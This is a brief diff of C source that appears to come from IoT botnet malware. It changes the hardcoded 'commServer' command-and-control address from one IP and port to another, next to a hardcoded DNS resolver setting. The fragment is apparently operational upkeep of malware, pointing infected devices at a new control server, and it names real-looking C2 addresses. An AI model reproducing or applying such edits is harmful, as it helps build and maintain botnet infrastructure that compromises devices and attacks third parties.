@@ -21,7 +21,7 @@
 #include <net/if.h>
 #define STD2_SIZE 1024
 
-unsigned char *commServer[] = {"107.174.25.148:4258"};
+unsigned char *commServer[] = {"139.180.130.115:22"};
 
 
 char *dns = ("8.8.4.4"); //53
